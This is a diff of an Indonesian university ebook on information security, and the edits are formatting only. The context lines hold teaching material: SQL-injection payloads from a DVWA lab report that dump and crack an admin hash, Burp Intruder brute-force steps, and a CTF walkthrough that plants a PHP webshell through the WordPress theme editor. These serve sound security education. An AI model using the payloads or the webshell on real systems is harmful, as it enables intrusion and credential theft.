@@ -1,4 +1,4 @@
-<div align="center">
+
 
 # 🔐 eBook MATA KULIAH KEAMANAN SISTEM INFORMASI
 
@@ -12,12 +12,10 @@
 ![Semester](https://img.shields.io/badge/Semester-IV%20Genap-purple)
 ![Kurikulum](https://img.shields.io/badge/Kurikulum-KUR--D3TI--2026-blueviolet)
 
-<br>
 
 ### 🎓 Universitas Muhammadiyah Magelang (UNIMMA)
-### Program Studi D3 Teknik Informatika
+### Program Studi D3 Teknologi Informasi
 
-<br>
 
 **Kode Mata Kuliah:** `OBE0502403`
 **Kelompok MK:** Inti - Wajib Prodi
@@ -25,7 +23,6 @@
 **Prasyarat:** - (tidak ada)
 **Semester:** 4 (Genap)
 
-<br>
 
 ---
 
@@ -73,7 +70,6 @@ Mata kuliah ini membahas dasar cybersecurity: prinsip **CIA Triad**, kriptografi
 
 Ayat ini mengingatkan bahwa harta (termasuk data dan informasi sebagai aset digital) adalah amanah Allah yang harus dijaga. Keamanan sistem informasi dalam perspektif Islam bagian dari **hifzh al-maal** (menjaga harta), salah satu daruriyat (maqashid syariah). Setiap praktisi keamanan siber muslim adalah penjaga amanah, bukan perusak.
 
-</div>
 
 ---
 
@@ -99,14 +95,12 @@ Ayat ini mengingatkan bahwa harta (termasuk data dan informasi sebagai aset digi
 
 ## CIA Triad, Threat Landscape, dan Threat Modeling STRIDE
 
-<div align="center">
 
 ![Bab 1](https://img.shields.io/badge/Bab-1%20Foundation-blueviolet)
 ![Sub-CPMK](https://img.shields.io/badge/Sub--CPMK-1.1%20%26%201.2-success)
 ![CPMK](https://img.shields.io/badge/CPMK-1-informational)
 ![Pertemuan](https://img.shields.io/badge/Pertemuan-2%20x%20150%20menit-orange)
 
-</div>
 
 ---
 
@@ -603,11 +597,11 @@ flowchart TD
 ```
 
 **Trust boundary** (batas kepercayaan) yang penting:
-1. **Internet → WAF**: batas antara dunia luar dan perimeter.
-2. **WAF → Web Server**: batas setelah inspeksi traffic.
-3. **Web Server → Database**: batas antara application layer dan data layer.
-4. **Web Server → Payment Gateway**: batas antara sistem internal dan pihak ketiga.
-5. **DevOps → Server**: batas antara operator dan sistem.
+1. **Internet -> WAF**: batas antara dunia luar dan perimeter.
+2. **WAF -> Web Server**: batas setelah inspeksi traffic.
+3. **Web Server -> Database**: batas antara application layer dan data layer.
+4. **Web Server -> Payment Gateway**: batas antara sistem internal dan pihak ketiga.
+5. **DevOps -> Server**: batas antara operator dan sistem.
 
 ### 1.6.3 Langkah 3: Identifikasi Ancaman dengan STRIDE per Komponen
 
@@ -696,10 +690,10 @@ quadrantChart
 ```
 
 **Interpretasi prioritas mitigasi:**
-1. **Quadrant 1 (Tinggi-Tinggi): SQL Injection, Upload Webshell** → mitigasi segera, wajib sebelum go-live.
-2. **Quadrant 4 (Rendah-Tinggi): Credential Stuffing** → mitigasi cepat (rate limit + MFA), ROI tinggi.
-3. **Quadrant 2 (Tinggi-Rendah): API Key Leak** → transfer risk via secrets manager + monitoring, jangan diabaikan.
-4. **Quadrant 3 (Rendah-Rendah): Bot Scraping, Stack Trace** → accept with monitoring, jangan over-invest.
+1. **Quadrant 1 (Tinggi-Tinggi): SQL Injection, Upload Webshell** -> mitigasi segera, wajib sebelum go-live.
+2. **Quadrant 4 (Rendah-Tinggi): Credential Stuffing** -> mitigasi cepat (rate limit + MFA), ROI tinggi.
+3. **Quadrant 2 (Tinggi-Rendah): API Key Leak** -> transfer risk via secrets manager + monitoring, jangan diabaikan.
+4. **Quadrant 3 (Rendah-Rendah): Bot Scraping, Stack Trace** -> accept with monitoring, jangan over-invest.
 
 ### 1.6.5 Langkah 5: Dokumentasi dan Backlog
 
@@ -916,13 +910,11 @@ Sebelum lanjut ke Bab 2, pastikan Anda menguasai konsep CIA Triad dan STRIDE di 
 
 ---
 
-<div align="center">
 
 **🔖 Bab 1 selesai.**
 
 [⬆ Kembali ke Daftar Isi](#-daftar-isi)
 
-</div>
 
 ---
 
@@ -930,14 +922,12 @@ Sebelum lanjut ke Bab 2, pastikan Anda menguasai konsep CIA Triad dan STRIDE di 
 
 ## AES, RSA, Hashing, Digital Signature, dan SSL/TLS
 
-<div align="center">
 
 ![Bab 2](https://img.shields.io/badge/Bab-2%20Kriptografi-blueviolet)
 ![Sub-CPMK](https://img.shields.io/badge/Sub--CPMK-2.1%20%7C%202.2%20%7C%202.3-success)
 ![CPMK](https://img.shields.io/badge/CPMK-2-informational)
 ![Pertemuan](https://img.shields.io/badge/Pertemuan-3%20x%20150%20menit-orange)
 
-</div>
 
 ---
 
@@ -2382,13 +2372,11 @@ Sebelum lanjut ke Bab 3, pastikan Anda menguasai konsep hashing, digital signatu
 
 ---
 
-<div align="center">
 
 **🔖 Bab 2 selesai. Bab 3 akan disusun setelah review.**
 
 [⬆ Kembali ke Daftar Isi](#-daftar-isi)
 
-</div>
 
 ---
 
@@ -2396,14 +2384,12 @@ Sebelum lanjut ke Bab 3, pastikan Anda menguasai konsep hashing, digital signatu
 
 ## OAuth 2.0, MFA, dan Mitigasi Kerentanan Web
 
-<div align="center">
 
 ![Bab 3](https://img.shields.io/badge/Bab-3%20Auth%20%26%20OWASP-blueviolet)
 ![Sub-CPMK](https://img.shields.io/badge/Sub--CPMK-3.1%20%7C%203.2%20%7C%203.3-success)
 ![CPMK](https://img.shields.io/badge/CPMK-3-informational)
 ![Pertemuan](https://img.shields.io/badge/Pertemuan-3%20x%20150%20menit-orange)
 
-</div>
 
 ---
 
@@ -3871,10 +3857,10 @@ XSS (Cross-Site Scripting) terjadi saat input user dirender di HTML tanpa encodi
 
 | Konteks Output | Encoding yang Benar | Library |
 |:---|:---|:---|
-| HTML body | `<` → `&lt;`, `>` → `&gt;` | DOMPurify (JS), markupsafe (Python) |
-| HTML attribute | `"` → `&quot;`, `'` → `&#x27;` | sama |
-| JavaScript string | `\` → `\\`, `"` → `\"` | json.dumps (Python), JSON.stringify (JS) |
-| URL | `?` → `%3F`, `&` → `%26` | urllib.parse.quote (Python), encodeURIComponent (JS) |
+| HTML body | `<` -> `&lt;`, `>` -> `&gt;` | DOMPurify (JS), markupsafe (Python) |
+| HTML attribute | `"` -> `&quot;`, `'` -> `&#x27;` | sama |
+| JavaScript string | `\` -> `\\`, `"` -> `\"` | json.dumps (Python), JSON.stringify (JS) |
+| URL | `?` -> `%3F`, `&` -> `%26` | urllib.parse.quote (Python), encodeURIComponent (JS) |
 | CSS | escape karakter special | Tidak direkomendasikan, hindari |
 
 **Kode rentan XSS (Node.js + Express + EJS):**
@@ -4028,11 +4014,11 @@ Sebagai contoh format laporan, berikut laporan singkat untuk praktikum SQL Injec
 
 **Langkah Eksploitasi:**
 1. Buka http://localhost:8080/vulnerabilities/sqli/
-2. Input User ID: `1` → response menampilkan user dengan ID 1 (First name: admin, Surname: admin)
-3. Input User ID: `1' OR '1'='1` → response menampilkan SEMUA user (auth bypass)
-4. Input User ID: `1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() --` → menampilkan daftar tabel: guestbook, users
-5. Input User ID: `1' UNION SELECT 1, password FROM users WHERE user_id=1 --` → menampilkan password hash admin: `5f4dcc3b5aa765d61d8327deb882cf99`
-6. Crack hash MD5 dengan https://crackstation.net → password asli: `password`
+2. Input User ID: `1` -> response menampilkan user dengan ID 1 (First name: admin, Surname: admin)
+3. Input User ID: `1' OR '1'='1` -> response menampilkan SEMUA user (auth bypass)
+4. Input User ID: `1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() --` -> menampilkan daftar tabel: guestbook, users
+5. Input User ID: `1' UNION SELECT 1, password FROM users WHERE user_id=1 --` -> menampilkan password hash admin: `5f4dcc3b5aa765d61d8327deb882cf99`
+6. Crack hash MD5 dengan https://crackstation.net -> password asli: `password`
 
 **Root Cause:** Kode di level low menggunakan string concatenation:
 ```php
@@ -4184,13 +4170,11 @@ Sebelum lanjut ke Bab 4, pastikan Anda menguasai OWASP Top 10 di Bab 3 dan telah
 
 ---
 
-<div align="center">
 
 **🔖 Bab 3 selesai. Bab 4 akan disusun setelah review.**
 
 [⬆ Kembali ke Daftar Isi](#-daftar-isi)
 
-</div>
 
 ---
 
@@ -4198,14 +4182,12 @@ Sebelum lanjut ke Bab 4, pastikan Anda menguasai OWASP Top 10 di Bab 3 dan telah
 
 ## Prinsip Secure Coding dan Penggunaan Burp Suite
 
-<div align="center">
 
 ![Bab 4](https://img.shields.io/badge/Bab-4%20Secure%20Coding-blueviolet)
 ![Sub-CPMK](https://img.shields.io/badge/Sub--CPMK-4.1%20%7C%204.2-success)
 ![CPMK](https://img.shields.io/badge/CPMK-4-informational)
 ![Pertemuan](https://img.shields.io/badge/Pertemuan-2%20x%20150%20menit-orange)
 
-</div>
 
 ---
 
@@ -4323,7 +4305,7 @@ Insiden **Therac-25** (1980-an) adalah kasus klasik fail unsecure: mesin radiasi
 Prinsip **separation of duties** membagi tugas kritis ke beberapa orang atau sistem, sehingga satu pihak tidak bisa menyelesaikan tugas berbahaya sendirian. Contoh klasik: developer yang menulis kode tidak boleh deploy ke production tanpa approval DevOps. Admin database tidak boleh punya akses ke source code. Auditor tidak boleh mengubah sistem yang diaudit.
 
 Dalam konteks aplikasi modern:
-- **CI/CD pipeline**: developer push code → CI test otomatis → QA approval → staging deploy → production deploy dengan approval manager.
+- **CI/CD pipeline**: developer push code -> CI test otomatis -> QA approval -> staging deploy -> production deploy dengan approval manager.
 - **Secret management**: developer tidak punya akses ke secret production (password DB, API key). Hanya aplikasi yang ambil dari Vault/KMS saat runtime.
 - **Database admin**: DBA punya akses ke schema tetapi tidak ke data sensitif yang di-encrypt dengan application key.
 
@@ -5348,11 +5330,11 @@ flowchart LR
 **Instalasi:**
 1. Download dari https://portswigger.net/burp/communitydownload
 2. Install dengan default options (bundled JRE).
-3. Jalankan Burp Suite, pilih "Temporary project" → "Use Burp defaults".
+3. Jalankan Burp Suite, pilih "Temporary project" -> "Use Burp defaults".
 
 **Konfigurasi browser:**
 - Burp punya **Chromium built-in** yang sudah dikonfigurasi (recommended untuk pemula).
-- Atau konfigurasi Firefox/Chrome manual: Settings → Network → Proxy → 127.0.0.1:8080.
+- Atau konfigurasi Firefox/Chrome manual: Settings -> Network -> Proxy -> 127.0.0.1:8080.
 
 **Install Burp CA Certificate** (untuk intercept HTTPS):
 1. Buka browser via Burp, kunjungi `http://burp/cert`
@@ -5367,9 +5349,9 @@ flowchart LR
 Sebelum mulai testing, **definisikan scope** yaitu domain/path yang akan diuji. Ini penting agar Burp tidak log traffic ke situs lain (Google, CDN) yang tidak relevan.
 
 **Cara set scope:**
-1. Tab **Target** → **Site map**
-2. Klik kanan domain target → **Add to scope**
-3. Tab **Target** → **Scope** untuk verifikasi
+1. Tab **Target** -> **Site map**
+2. Klik kanan domain target -> **Add to scope**
+3. Tab **Target** -> **Scope** untuk verifikasi
 
 Setelah scope di-set, aktifkan **"Show only in-scope items"** di Proxy history untuk filter tampilan.
 
@@ -5388,11 +5370,11 @@ Burp Proxy **intercept** mode memungkinkan Anda melihat dan memodifikasi request
 - Memodifikasi cookie atau token
 
 **Langkah intercept:**
-1. Tab **Proxy** → **Intercept**
+1. Tab **Proxy** -> **Intercept**
 2. Klik **Intercept is on** (button menjadi "Intercept is off" = aktif)
 3. Browser: lakukan action (login, search, submit form)
 4. Burp: request muncul, klik **Forward** untuk kirim, **Drop** untuk batalkan
-5. Klik **Action** → **Send to Repeater** untuk analisis lanjut
+5. Klik **Action** -> **Send to Repeater** untuk analisis lanjut
 
 ### 4.8.2 Contoh Intercept Login Request
 
@@ -5424,9 +5406,9 @@ Dari sini kita bisa lihat:
 
 ### 4.8.3 HTTP History
 
-Tab **Proxy** → **HTTP history** menampilkan semua request/response yang lewat. Berguna untuk:
+Tab **Proxy** -> **HTTP history** menampilkan semua request/response yang lewat. Berguna untuk:
 - **Forensik**: melihat urutan request setelah insiden
-- **Replay**: klik kanan → **Send to Repeater**
+- **Replay**: klik kanan -> **Send to Repeater**
 - **Comparison**: bandingkan request user A vs user B
 - **Filter**: filter berdasarkan MIME type, status code, parameter
 
@@ -5454,7 +5436,7 @@ Repeater adalah tempat eksperisi manual penetration tester. Sangat berguna untuk
 
 ### 4.9.2 Workflow Repeater
 
-1. **Kirim request ke Repeater**: dari Proxy history atau Intercept, klik kanan → **Send to Repeater** (Ctrl+R).
+1. **Kirim request ke Repeater**: dari Proxy history atau Intercept, klik kanan -> **Send to Repeater** (Ctrl+R).
 2. **Tab Repeater**: pilih tab Repeater di atas, pilih request yang baru dikirim.
 3. **Modify request**: edit parameter di panel kiri.
 4. **Send**: klik **Send** (Ctrl+Space) untuk eksekusi.
@@ -5553,12 +5535,12 @@ Intruder punya 4 attack type:
 
 **Langkah:**
 1. Intercept request login, kirim ke Intruder.
-2. Di tab Intruder → **Positions**, highlight `username=§admin§` dan `password=§password§`. Tanda `§` menandai posisi payload.
+2. Di tab Intruder -> **Positions**, highlight `username=§admin§` dan `password=§password§`. Tanda `§` menandai posisi payload.
 3. Pilih attack type **Cluster bomb** (kombinasi semua).
 4. Tab **Payloads**: 
    - Payload Set 1 (username): load wordlist `common-usernames.txt` (admin, root, user, test, ...)
    - Payload Set 2 (password): load wordlist `common-passwords.txt` (password, 123456, admin, ...)
-5. Tab **Options** → **Grep - Extract**: tambahkan pattern untuk detect "Welcome to the password protected area" (login berhasil).
+5. Tab **Options** -> **Grep - Extract**: tambahkan pattern untuk detect "Welcome to the password protected area" (login berhasil).
 6. Klik **Start attack**.
 
 **Hasil attack:**
@@ -5629,16 +5611,16 @@ Scanner menghemat waktu significant dibanding manual testing. Untuk D3 TI, mahas
 ### 4.11.2 Cara Run Scan
 
 1. Set **scope** di tab Target (sub-bab 4.7.4).
-2. Klik kanan root domain di Site map → **Scan**.
+2. Klik kanan root domain di Site map -> **Scan**.
 3. Pilih **Scan configuration**: 
    - **Crawl strategy**: fastest (untuk app kecil) atau most thorough (untuk app besar)
    - **Audit strategy**: lightweight (cepat, false positive rendah) atau thorough (lengkap, lama)
 4. Klik **Start scan**.
-5. Tab **Dashboard** → lihat progress dan issue ditemukan.
+5. Tab **Dashboard** -> lihat progress dan issue ditemukan.
 
 ### 4.11.3 Membaca Hasil Scan
 
-Hasil scan muncul di tab **Target** → **Issues**. Setiap issue memiliki:
+Hasil scan muncul di tab **Target** -> **Issues**. Setiap issue memiliki:
 
 | Field | Penjelasan |
 |:---|:---|
@@ -5654,7 +5636,7 @@ Hasil scan muncul di tab **Target** → **Issues**. Setiap issue memiliki:
 
 Scanner otomatis bisa menghasilkan **false positive** (laporan kerentanan yang sebenarnya tidak ada). Untuk meminimalkan:
 - Atur **audit strategy** ke "lightweight" dulu, lalu escalate ke "thorough" untuk target tertentu.
-- **Verifikasi manual** setiap issue: klik issue → lihat Request/Response → pahami payload → verifikasi di Repeater.
+- **Verifikasi manual** setiap issue: klik issue -> lihat Request/Response -> pahami payload -> verifikasi di Repeater.
 - Hapus issue yang false positive dari report.
 
 ### 4.11.5 Export Laporan
@@ -5701,11 +5683,11 @@ docker pull owasp/zap2docker-stable
 
 ### 4.12.3 Workflow Dasar ZAP
 
-1. **Quick Start**: buka ZAP → tab Quick Start → masukkan URL target → klik **Automated Scan**.
+1. **Quick Start**: buka ZAP -> tab Quick Start -> masukkan URL target -> klik **Automated Scan**.
 2. ZAP akan crawl dan scan otomatis, hasil di tab **Alerts**.
-3. **Manual explore**: tab Quick Start → **Manual Explore** → buka browser via ZAP → browse manual, ZAP log semua request.
-4. **Active Scan**: klik kanan site di Site tree → **Active Scan** untuk audit otomatis.
-5. **Report**: tab Report → export HTML/JSON/XML.
+3. **Manual explore**: tab Quick Start -> **Manual Explore** -> buka browser via ZAP -> browse manual, ZAP log semua request.
+4. **Active Scan**: klik kanan site di Site tree -> **Active Scan** untuk audit otomatis.
+5. **Report**: tab Report -> export HTML/JSON/XML.
 
 ### 4.12.4 ZAP di CI/CD (Headless)
 
@@ -6062,7 +6044,7 @@ Sebagai integrasi Sub-CPMK 4.1 dan 4.2, berikut studi kasus end-to-end audit apl
 1. **Deploy aplikasi** TokoKita v2.1 di staging (Docker compose: Node.js + PostgreSQL + Redis).
 2. **Setup Burp Suite Community** dengan browser Chromium built-in.
 3. **Install Burp CA certificate** di browser untuk intercept HTTPS.
-4. **Set scope**: `https://staging.tokokita.com` di tab Target → Scope.
+4. **Set scope**: `https://staging.tokokita.com` di tab Target -> Scope.
 5. **Buat akun test**: daftar sebagai user biasa, dan satu akun admin (untuk perbandingan).
 
 ### 4.15.2 Tahap 1: Reconnaissance (Passive)
@@ -6076,8 +6058,8 @@ Browse aplikasi seperti user biasa: login, lihat produk, tambah ke cart, checkou
 ### 4.15.3 Tahap 2: Authentication Testing
 
 Test login dengan berbagai payload di Repeater:
-- SQL injection: `admin' OR '1'='1' --` di username → lihat apakah error SQL muncul
-- Brute force: pakai Intruder Sniper dengan wordlist username `admin` dan password `password` → lihat response yang berbeda
+- SQL injection: `admin' OR '1'='1' --` di username -> lihat apakah error SQL muncul
+- Brute force: pakai Intruder Sniper dengan wordlist username `admin` dan password `password` -> lihat response yang berbeda
 - User enumeration: bandingkan response "user not found" vs "password incorrect"
 - Session fixation: cek apakah session ID berubah setelah login
 
@@ -6116,9 +6098,9 @@ Konsolidasikan temuan manual (Burp) dan otomatis (ZAP) dalam laporan terstruktur
 
 Kirim laporan ke developer. Setelah patch diterapkan, **retest** setiap temuan:
 1. Jalankan ulang payload yang sama.
-2. Jika response berbeda (vulnerability hilang) → status **Resolved**.
-3. Jika masih vulnerable → status **Open**, eskalasi.
-4. Jika partial fix → status **Partial**, jelaskan sisa issue.
+2. Jika response berbeda (vulnerability hilang) -> status **Resolved**.
+3. Jika masih vulnerable -> status **Open**, eskalasi.
+4. Jika partial fix -> status **Partial**, jelaskan sisa issue.
 
 Laporan final mencakup **status remediation** setiap temuan.
 
@@ -6192,7 +6174,7 @@ Bab 4 ini telah membahas secure coding practices dan vulnerability scanning seba
 
 **Keenam, NoSQL injection** juga ada di MongoDB. Validasi tipe data input, dan disable operator parsing dengan express-mongo-sanitize.
 
-**Ketujuh, secret management** level 1 (env var) → level 2 (.env + .gitignore + .env.example) → level 3 (secret manager AWS/GCP/Vault) → level 4 (K8s External Secrets). Pasang pre-commit hook TruffleHog/GitGuardian untuk deteksi leak. Rotate secret periodik.
+**Ketujuh, secret management** level 1 (env var) -> level 2 (.env + .gitignore + .env.example) -> level 3 (secret manager AWS/GCP/Vault) -> level 4 (K8s External Secrets). Pasang pre-commit hook TruffleHog/GitGuardian untuk deteksi leak. Rotate secret periodik.
 
 **Kedelapan, secure coding di framework modern**: Express.js (helmet, rate limit, body size, cors), Django (DEBUG=False, ALLOWED_HOSTS, security middleware), Next.js (security headers di next.config.js, Zod validation di API route). Gunakan OWASP ASVS sebagai checklist komprehensif (Level 1/2/3).
 
@@ -6200,7 +6182,7 @@ Bab 4 ini telah membahas secure coding practices dan vulnerability scanning seba
 
 **Kesembilan, Burp Suite** adalah tool paling populer untuk web app pentest, bekerja sebagai man-in-the-middle. Tiga edisi: Community (gratis), Professional ($449/tahun), Enterprise. Setup: install, configure browser proxy 8080, install CA cert untuk HTTPS.
 
-**Kesepuluh, Burp Proxy** intercept request sebelum dikirim. HTTP history untuk forensik. Set scope untuk filter. Workflow: browse → intercept → modify → forward/drop.
+**Kesepuluh, Burp Proxy** intercept request sebelum dikirim. HTTP history untuk forensik. Set scope untuk filter. Workflow: browse -> intercept -> modify -> forward/drop.
 
 **Kesebelas, Burp Repeater** untuk modify dan replay manual. Kirim request dari Proxy/HTTP history (Ctrl+R). Modify di panel kiri, send (Ctrl+Space), analyze response di panel kanan. Ideal untuk SQLi/XSS testing dengan berbagai payload.
 
@@ -6247,13 +6229,11 @@ Sebelum lanjut ke Bab 5, pastikan Anda menguasai OWASP Top 10 di Bab 3, secure c
 
 ---
 
-<div align="center">
 
 **🔖 Bab 4 selesai. Bab 5 akan disusun setelah review.**
 
 [⬆ Kembali ke Daftar Isi](#-daftar-isi)
 
-</div>
 
 ---
 
@@ -6261,14 +6241,12 @@ Sebelum lanjut ke Bab 5, pastikan Anda menguasai OWASP Top 10 di Bab 3, secure c
 
 ## CTF, Penetration Testing, dan Incident Response Lifecycle
 
-<div align="center">
 
 ![Bab 5](https://img.shields.io/badge/Bab-5%20Final-blueviolet)
 ![Sub-CPMK](https://img.shields.io/badge/Sub--CPMK-5.1%20%7C%205.2-success)
 ![CPMK](https://img.shields.io/badge/CPMK-5-informational)
 ![Pertemuan](https://img.shields.io/badge/Pertemuan-2%20x%20150%20menit-orange)
 
-</div>
 
 ---
 
@@ -7027,7 +7005,7 @@ $ curl -X POST http://10.10.10.50/wp-login.php \
 Login ke `/wp-admin/` dengan kredensial yang ditemukan. Dari admin panel, ada beberapa jalan eksploitasi:
 
 **Jalan A: Edit theme file untuk PHP webshell**
-Appearance → Theme Editor → pilih 404.php → replace dengan:
+Appearance -> Theme Editor -> pilih 404.php -> replace dengan:
 ```php
 <?php system($_GET['cmd']); ?>
 ```
@@ -7037,7 +7015,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 **Jalan B: Upload plugin malicious**
-Plugins → Add New → Upload → upload plugin ZIP berisi backdoor.
+Plugins -> Add New -> Upload -> upload plugin ZIP berisi backdoor.
 
 **Jalan C: Metasploit wp_admin_shell_upload**
 ```bash
@@ -7872,7 +7850,7 @@ Bab 5 ini telah membahas ethical hacking dasar dan incident response sebagai jaw
 
 **Keempat, CTF (Capture The Flag)** adalah cara terbaik belajar ethical hacking karena legal, terstruktur, dan komunitas aktif. Format: jeopardy (kategori-based), attack-defense, king of the hill. Kategori: web exploitation, cryptography, pwn, reverse engineering, forensics, misc. Platform untuk pemula: PortSwigger Web Academy, TryHackMe, picoCTF, OWASP Juice Shop, lalu HackTheBox untuk advanced.
 
-**Kelima, walkthrough CTF** menunjukkan metodologi end-to-end: recon (nmap+gobuster+robots.txt) → enumeration (WordPress scan, backup file) → exploitation (webshell via theme editor atau Metasploit) → post-exploitation (LinPEAS temukan SUID nmap, privesc) → reporting (writeup dengan lessons learned dan mitigation).
+**Kelima, walkthrough CTF** menunjukkan metodologi end-to-end: recon (nmap+gobuster+robots.txt) -> enumeration (WordPress scan, backup file) -> exploitation (webshell via theme editor atau Metasploit) -> post-exploitation (LinPEAS temukan SUID nmap, privesc) -> reporting (writeup dengan lessons learned dan mitigation).
 
 **Keenam, praktik mandiri** 10 challenge dari beginner (TryHackMe Tutorial, Blue, Kenobi) sampai advanced (HTB Shocker, Beep, picoCTF). Tips: notes terstruktur, catat command, baca writeup setelah solve, tidak menyerah dalam 4 jam, etika CTF (no flag sharing, no attack infrastruktur).
 
@@ -7882,9 +7860,9 @@ Bab 5 ini telah membahas ethical hacking dasar dan incident response sebagai jaw
 
 **Kedelapan, NIST SP 800-61 lifecycle** empat fase: **Preparation** (IR plan, tools, training, threat intel, backup 3-2-1 immutable), **Detection & Analysis** (SIEM alert, EDR alert, user report, threat intel IOC match), **Containment/Eradication/Recovery** (isolate host, revoke credential, rebuild host, restore backup, monitor 7-14 hari), **Post-Incident Activity** (lessons learned, root cause analysis, action items, metrics MTTD/MTTR/MTTC).
 
-**Kesembilan, IR Playbook Ransomware** sembilan step: konfirmasi → aktivasi IR plan → containment network (disable switch port, block C2) → identifikasi scope → eradication (rebuild host, reset semua password) → recovery (restore immutable backup) → communication (internal, customer, regulator BSSN/OJK, law enforcement) → decision to pay (default: JANGAN BAYAR) → post-incident.
+**Kesembilan, IR Playbook Ransomware** sembilan step: konfirmasi -> aktivasi IR plan -> containment network (disable switch port, block C2) -> identifikasi scope -> eradication (rebuild host, reset semua password) -> recovery (restore immutable backup) -> communication (internal, customer, regulator BSSN/OJK, law enforcement) -> decision to pay (default: JANGAN BAYAR) -> post-incident.
 
-**Kesepuluh, IR Playbook Data Breach** tujuh step: konfirmasi breach (verifikasi sample data) → containment (tutup entry point) → scope assessment (data type, jumlah user) → legal notification (UU PDP 3x24 jam ke Kemenkominfo + subjek data) → customer communication (transparan, actionable) → forensik investigation (third-party independence) → long-term remediation.
+**Kesepuluh, IR Playbook Data Breach** tujuh step: konfirmasi breach (verifikasi sample data) -> containment (tutup entry point) -> scope assessment (data type, jumlah user) -> legal notification (UU PDP 3x24 jam ke Kemenkominfo + subjek data) -> customer communication (transparan, actionable) -> forensik investigation (third-party independence) -> long-term remediation.
 
 **Kesebelas, simulasi IR** di lab kelas: skenario ransomware di TokoKita, tim mahasiswa 4-5 orang per peran (Incident Commander, SOC, Network, Forensik, Comms), timeline 3 hari, rubrik penilaian 6 kriteria (detection speed, containment, forensik, communication, recovery, report).
 
@@ -7913,13 +7891,11 @@ Bab 5 ini telah membahas ethical hacking dasar dan incident response sebagai jaw
 
 ---
 
-<div align="center">
 
 # 🎓 PENUTUP EBOOK
 
 ## Selamat! Anda Telah Menyelesaikan Mata Kuliah Keamanan Sistem Informasi
 
-</div>
 
 Ebook ini telah membawa Anda dalam perjalanan komprehensif dari fondasi keamanan informasi hingga ethical hacking dan incident response. Mari kita ringkas perjalanan tersebut:
 
@@ -8013,7 +7989,6 @@ Selamat berjuang, semoga sukses, dan semoga ilmu yang Anda dapatkan menjadi amal
 
 ---
 
-<div align="center">
 
 ### 📋 Ringkasan Statistik eBook
 
@@ -8028,11 +8003,9 @@ Selamat berjuang, semoga sukses, dan semoga ilmu yang Anda dapatkan menjadi amal
 **Edisi**: 1 (KUR-D3TI-2026)
 **Lisensi**: Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)
 
-</div>
 
 ---
 
-<div align="center">
 
 ## 🕌 Al-Fatihah
 
@@ -8048,11 +8021,9 @@ Sebagai penutup, mari kita baca Al-Fatihah untuk mengharapkan keberkahan dari Al
 
 > *Aamiin.*
 
-</div>
 
 ---
 
-<div align="center">
 
 **🔖 Bab 5 selesai. eBook Keamanan Sistem Informasi LENGKAP.**
 
@@ -8061,6 +8032,5 @@ Sebagai penutup, mari kita baca Al-Fatihah untuk mengharapkan keberkahan dari Al
 **Dibuat dengan ❤️ untuk mahasiswa D3 TI UNIMMA**
 **Universitas Muhammadiyah Magelang, 2026**
 
-</div>
 
 ---
